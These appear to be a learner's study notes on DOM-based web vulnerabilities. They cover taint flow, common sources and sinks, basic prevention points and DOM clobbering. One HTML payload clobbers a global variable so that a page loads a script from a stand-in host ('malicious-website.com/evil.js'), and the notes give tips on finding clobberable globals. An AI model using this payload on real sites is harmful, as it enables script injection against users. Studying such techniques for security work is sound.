The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem.

## Taint-flow 

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

### What is taint flow?

To either exploit or mitigate these vulnerabilities, it is important to first familiarize yourself with the basics of taint flow between sources and sinks.

#### Sources

A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.

## Sinks

the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

    `goto = location.hash.slice(1) if (goto.startsWith('https:')) {   location = goto; }`

## Common Sources

		document.URL 
		document.documentURI 
		document.URLUnencoded 
		document.baseURI
		 location
		  document.cookie 
		  document.referrer 
		  window.name 
		  history.pushState 
		  history.replaceState 
		  localStorage 
		  sessionStorage 
		  IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) 
		  Database


![[Pasted image 20250820115435.png]]

### How to prevent DOM-based taint-flow vulnerabilities

1. There is no single action you take to eliminate the threat of DOM- based attacks entirely.
2. you can avoid the  allowing data from any untrusted resources.
3. the defences must be implemented within the client-side code
4.  The relevant data can be validated on a whitelist basis, only allowing content that is known to be safe.
5. it involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.

## DOM clobbering

DOM clobbering is an advanced technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behaviour of JavaScript on the website.

useful cases in the xss is not possible, but you can control some HTML on page  where the attributes id or name are whitelisted by the html filter.

## How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:

`var someObject = window.someObject || {};` # find this type code

If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:

`<script> window.onload = function(){ let someObject = window.someObject || {}; let script = document.createElement('script'); script.src = someObject.url; document.body.appendChild(script); }; </script>`

To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:

`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.

my observation is you have to find the global variable there you can execute the DOM clobbering just create a paylaod according to the id para / html para than you proceed.

